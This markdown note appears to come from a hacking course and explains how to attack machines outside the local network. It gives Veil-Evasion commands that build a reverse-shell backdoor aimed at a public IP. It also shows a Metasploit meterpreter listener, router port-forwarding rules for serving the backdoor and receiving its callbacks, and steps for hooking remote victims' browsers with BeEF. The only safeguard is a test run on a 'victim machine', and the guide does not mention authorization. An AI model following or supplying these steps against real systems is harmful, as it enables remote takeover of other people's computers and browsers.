# Hacking outside the local network
-   All server-side and client-side attacks work outside the network, only connection needs to be reconfigured
-   It can be done by:
    -   Port forwarding through the router
    -   Installing Kali / tools in the cloud
    -   Port forwarding using SSH
    -   Tunneling services


## Backdoor outside the local network
-   This method shows how to create a backdoor to the pc outside our network. Access rights to the router connected to the internet is needed.
-   to create a backdoor public, public IP is needed. To get public IP, write to google "what is my ip"
-   create backdoor with Veil-Evasion:
```bash
veil-evasion
list
use 9 # choose the reverse payload
set LPORT 8080
set LHOST 89.100.146.187 # use the public IP
generate #generate the payload
```
-   move the file to web server directory (/var/www/html/)
-   setup listener by Mestasploit for the backdoor connection
```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 192.168.72.129 # use private local IP of attacker machine as before in 09_*.MD
set LPORT 8080
exploit
```
-   now set port forwarding on router:
    1)  get router ip `route -n`
    2)  go to the ip in browser login to the router
    3)  find ip forwarding / forwarding / virtual network
    4)  set public port range to `8080-8080`, target port range to `8080-8080`, target IP to attacker IP (in our case `192.168.72.129`), protocol `Both`
    5)  second rule for downloading the backdoor outside the network: public port range to `80-80`, Target port range to `80-80`, Target IP to attacker IP, protocol `Both`


-   to try this works, just download the payload exe file on victim machine from url and run it


## Hooking browser outside the network using BeEF
-   Start BeEF
-   Place the generated hook.js to the page in web server directory as described before in 10_*.MD, just use public IP instead of local one.
-   now set port forwarding on router, new rule:
    -   public port range to `3000-3000`, target port range to `3000-3000`, target IP to attacker IP (in our case `192.168.72.129`), protocol `Both`


-   to try this if this works, just navigate in the browser of victims machine to the url page with the hook.js (for example: [89.100.146.187/index.html](89.100.146.187/index.html))  


Note: <strong>DMZ forwarding</strong>
-   setting on router, which forwards all requests to any port to one specific IP address
-   alternative to the previous port forwarding setting